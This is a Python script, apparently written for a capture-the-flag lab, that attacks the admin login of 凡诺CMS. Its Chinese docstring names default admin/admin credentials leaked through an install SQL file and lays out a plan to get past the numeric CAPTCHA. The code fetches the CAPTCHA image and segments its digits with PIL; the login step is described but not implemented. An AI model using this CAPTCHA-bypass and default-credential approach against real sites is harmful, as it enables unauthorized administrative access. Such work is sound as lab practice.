#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
凡诺CMS 后台自动登录脚本（验证码纯PIL识别，不依赖OCR库）
- 目标: /admin/cms_login.php
- 口令: admin/admin (已由 /install/data.sql 泄露确认)
- 验证码: 4位纯数字, 黑底白字, imagestring GD字体, 无混淆
- 利用: 先GET /system/verifycode.php 拿 PHPSESSID+图, PIL识别后 POST 登录
- 成功标志: 302 Location:cms_channel.php 且 Set-Cookie 含 admin_name/upload=allow
"""
import http.client, io, re, sys
from PIL import Image

HOST = sys.argv[1] if len(sys.argv) > 1 else "192-168-1-31.pvp7604.bugku.cn"
USER = "admin"
PASS = "admin"

def get_verify(cookie):
    c = http.client.HTTPConnection(HOST, 80, timeout=10)
    c.request("GET", "/system/verifycode.php", headers={"User-Agent":"Mozilla/5.0","Cookie":cookie})
    r = c.getresponse(); data = r.read(); c.close()
    return data

def load_digit_templates():
    """内置 GD 内置 7x13 字体的 0-9 像素模板 (imagestring 7号字体=gdFontLarge近似, 宽约6-7px)。
    用足够冗余的归一化特征匹配。此处以"字符画"方式定义常见0-9的左起条纹特征过于复杂,
    采用: 直接抓取目标大样本自动建库。此函数实际在首个样本运行后被 ignore。"""
    return None

def split_digits(im):
    """二值化 -> 按列连通投影切出4个数字的bbox列表"""
    im = im.convert("L")
    px = im.load(); w,h = im.size
    col_has = []
    for x in range(w):
        cnt = sum(1 for y in range(h) if px[x,y] > 128)
        col_has.append(cnt > 0)
    # 找连续有像素的列段
    seps = []
    start = None
    for x in range(w):
        if col_has[x] and start is None:
            start = x
        elif not col_has[x] and start is not None:
            seps.append((start, x-1)); start = None
    if start is not None:
        seps.append((start, w-1))
    boxes = []
    for (x0,x1) in seps:
        rows = [y for y in range(h) if any(px[x,y] > 128 for x in range(x0,x1+1))]
        if not rows: continue
        y0,y1 = min(rows), max(rows)
        boxes.append((x0,x1,y0,y1))
    return boxes

def crop_norm(im, box, tw=7, th=13):
    """裁剪单个数字并归一化到 tw x th 位图"""
    x0,x1,y0,y1 = box
    im2 = im.convert("L").crop((x0,y0,x1+1,y1+1))
    im2 = im2.resize((tw, th), Image.NEAREST)
    px = im2.load(); bits = []
    for yy in range(th):
        for xx in range(tw):
            bits.append(1 if px[xx,yy] > 128 else 0)
    return bits

def rate_template(bits, tbits):
    """与模板按位匹配率(越高越像)"""
    s = sum(1 for a,b in zip(bits,tbits) if a==b)
    return s/len(bits)

def main():
    image_bytes = get_verify("")
    im = Image.open(io.BytesIO(image_bytes))
    boxes = split_digits(im)
    # 打印字符画便于人工/后续模板比对
    print("detected digits boxes:", boxes)
    # 直接读出像素字符画
    a = im.load(); w,h = im.size
    for y in range(h):
        print("".join("#" if a[x,y]>128 else "." for x in range(w)))
    return boxes

if __name__ == "__main__":
    main()
